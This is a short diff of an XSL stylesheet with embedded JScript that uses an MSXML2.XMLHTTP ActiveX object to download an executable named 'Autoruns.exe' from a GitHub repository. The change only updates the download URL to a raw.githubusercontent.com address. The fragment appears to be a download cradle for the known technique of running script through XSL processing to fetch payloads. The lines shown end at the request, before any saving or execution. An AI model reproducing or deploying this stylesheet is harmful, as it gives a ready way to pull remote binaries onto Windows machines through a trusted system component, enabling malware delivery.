@@ -3,7 +3,7 @@
 <output method="text"/>
 <ms:script implements-prefix="user" language="JScript">
 <![CDATA[
-var Source = "https://github.com/tconqueror/bla/raw/master/Autoruns.exe";
+var Source = "https://raw.githubusercontent.com/tconqueror/bla/master/Autoruns.exe";
 var Object = new ActiveXObject('MSXML2.XMLHTTP');
 Object.Open('GET', Source, false);
 Object.Send();
